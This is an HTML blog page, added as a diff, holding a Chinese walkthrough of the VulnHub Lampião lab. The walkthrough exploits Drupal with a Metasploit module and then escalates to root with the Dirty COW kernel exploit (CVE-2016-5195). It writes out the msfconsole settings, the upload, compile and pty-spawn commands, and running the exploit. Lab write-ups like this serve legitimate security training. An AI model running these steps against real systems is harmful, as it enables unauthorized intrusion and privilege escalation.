@@ -1,0 +1,224 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+        <title>剣の魔王の小屋</title>
+        <meta name="author" content="剣の魔王">
+        <meta name="description" content="这个网站没有描述">
+        <meta name="keywords" content="">
+        <link rel="icon" href="image/head.png">
+        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
+        <script src="https://cdn.staticfile.org/font-awesome/6.2.0/js/all.min.js"></script>
+        
+        <link rel="stylesheet" href="/css/fonts.min.css">
+        <link rel="stylesheet" href="/css/particlex.css">
+        
+        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
+    <meta name="generator" content="Hexo 5.4.2"></head>
+    <body>
+        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:2147483647;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out;-webkit-user-select:none;-moz-user-select:none;user-select:none"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:50vmin;height:50vmin;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #a3ddfb;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">加载过慢请开启缓存(浏览器默认开启)</p><div><img alt="loading" src="/loading.gif"></div></div></div></div></div>
+        <div id="layout">
+            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
+            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
+            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
+            <transition name="into">
+                <div v-show="show_page" style="display: -not-none">
+                    <div id="menu_show">
+                         
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">剣の魔王の小屋</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;about</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;tags</span>
+        </a>
+        
+    </div>
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
+        <div :class="'title'" @click="menu_show = !menu_show">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;剣の魔王の小屋</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+                    </div>
+                    <div id="main">
+                        
+<div class="article">
+    <div>
+        <h1> </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2024/1/8
+        </span>
+        
+        
+    </div>
+    <div class="content" v-pre>
+        <h1 id="脏牛内核漏洞-Linux内网提权"><a href="#脏牛内核漏洞-Linux内网提权" class="headerlink" title="脏牛内核漏洞-Linux内网提权"></a>脏牛内核漏洞-Linux内网提权</h1><p>靶机下载链接：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/xxe-lab-1,254/"><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/lampiao-1,249/">Lampião: 1 ~ VulnHub</a></a></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/MCTSOG/article/details/124640418">第63天-权限提升-Linux 脏牛内核漏洞&amp;SUID&amp;信息收_linux提权手法总结.pdf-CSDN博客</a></p>
+<p>Linux信息探针地址：<a target="_blank" rel="noopener" href="https://github.com/The-Z-Labs/linux-exploit-suggester">The-Z-Labs/linux-exploit-suggester: Linux privilege escalation auditing tool (github.com)</a></p>
+<p>脏牛exp：<a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p>
+<p><strong><span id="more"></span></strong></p>
+<p>先获取本机的ip地址，之后nmap扫描该网段</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-141604.png" alt="image-20240108141603166"></p>
+<p>发现靶机是192.168.145.144地址，然后使用nmap深入扫描</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-141701.png" alt="image-20240108141659904"></p>
+<p>80端口开启，访问</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-141841.png" alt="image-20240108141839545"></p>
+<p>没有什么有用信息，继续扫描开放端口</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-142023.png" alt="image-20240108142022617"></p>
+<p>1898端口也开放，继续访问</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-142123.png" alt="image-20240108142122041"></p>
+<p>看一圈下来发现使用的是drupal的CMS框架，网上搜索发现爆过漏洞，或者使用msfconsole搜索</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-142440.png" alt="image-20240108142439025"></p>
+<p><code>msfconsole</code></p>
+<p><code>search drupal</code></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-143402.png" alt="image-20240108143400970"></p>
+<p><code>use 1</code></p>
+<p><code>show options        //显示设置</code> </p>
+<p><code>set rhosts 192.168.145.144            //靶机地址</code></p>
+<p><code>set rport 1898                //目标端口</code></p>
+<p><code>exploit                //开启远程会话</code></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-143558.png" alt="image-20240108143557278"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-143824.png" alt="image-20240108143823008"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-144111.png" alt="image-20240108144109772"></p>
+<p>将下载好的探针脚本放到kali后上传到目标主机</p>
+<p><code>upload /tmp/linux-exploit-suggester.sh /tmp/1.sh</code></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-144524.png" alt="image-20240108144522778"></p>
+<p><code>shell</code></p>
+<p><code>cd /tmp</code></p>
+<p><code>chmod +x 1.sh        //赋权</code></p>
+<p><code>./1.sh</code></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-145251.png" alt="image-20240108145250590"></p>
+<p>按理来说扫描出来的都得尝试一遍，把exp脚本下载下来放到靶机</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-145423.png" alt="image-20240108145422102"></p>
+<p><code>upload /root/dcow.cpp /tmp</code></p>
+<p><code>cd /tmp</code></p>
+<p><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil            //gcc编译</code></p>
+<p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;) //使用python开启一个模拟终端利用漏洞，交互式shell</code></p>
+<p><code>./dcow</code></p>
+<p>得到root的密码为dirtyCowFun，使用密码登录root成功，得到root目录下的flag</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-151045.png" alt="image-20240108151044620"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-151759.png" alt="image-20240108151758263"></p>
+
+    </div>
+    
+    
+</div>
+                         
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2024 剣の魔王の小屋
+            <span class="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            @剣の魔王
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a></div>
+        
+    </div>
+</footer>
+                    </div>
+                </div>
+            </transition>	
+            <div id="img_show">
+                <img id="img_content" alt="img_show">
+            </div>
+			<canvas
+			id="fireworks"
+			style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767">
+			</canvas>
+			<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+			<script src="/js/fireworks.min.js"></script>
+        </div>
+        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
+        <script src="/js/particlex.js"></script>
+        <script src="/js/showimg.js"></script>
+        
+
+    </body>
+</html>
